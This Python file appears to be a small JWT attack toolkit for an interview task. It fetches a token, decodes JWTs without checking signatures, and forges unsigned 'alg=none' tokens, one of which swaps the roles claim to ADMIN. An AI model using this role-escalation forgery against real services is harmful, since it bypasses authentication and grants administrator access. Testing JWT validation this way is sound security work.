import jwt
import json
import base64
import logging
import requests

logger = logging.getLogger(__name__)


def refresh_bank_info_token(base_url):
    url = f"{base_url}/users/generate-token-for-interview-task"
    try:
        resp = requests.post(url, timeout=15)
        if resp.status_code == 200:
            data = resp.json()
            token = data.get("token") or data.get("data", {}).get("token")
            if token:
                logger.info("Refreshed bank info token")
                return token
        logger.warning(f"Token refresh got {resp.status_code}: {resp.text[:200]}")
    except Exception as exc:
        logger.error(f"Token refresh failed: {exc}")
    return None


def decode_jwt_unsafe(token):
    """Decode JWT without signature verification."""
    try:
        return jwt.decode(token, options={"verify_signature": False})
    except Exception:
        try:
            parts = token.split(".")
            if len(parts) >= 2:
                padded = parts[1] + "=" * (4 - len(parts[1]) % 4)
                return json.loads(base64.urlsafe_b64decode(padded))
        except Exception:
            pass
    return None


def forge_token_none_alg(payload_dict):
    """Build a JWT with alg=none for testing."""
    header = base64.urlsafe_b64encode(
        json.dumps({"alg": "none", "typ": "JWT"}).encode()
    ).rstrip(b"=").decode()
    payload = base64.urlsafe_b64encode(
        json.dumps(payload_dict).encode()
    ).rstrip(b"=").decode()
    return f"{header}.{payload}."


def forge_token_role_escalation(original_token, target_role="ADMIN"):
    """Decode, swap role, re-encode with alg=none."""
    claims = decode_jwt_unsafe(original_token)
    if not claims:
        return None
    claims["roles"] = [target_role]
    return forge_token_none_alg(claims)
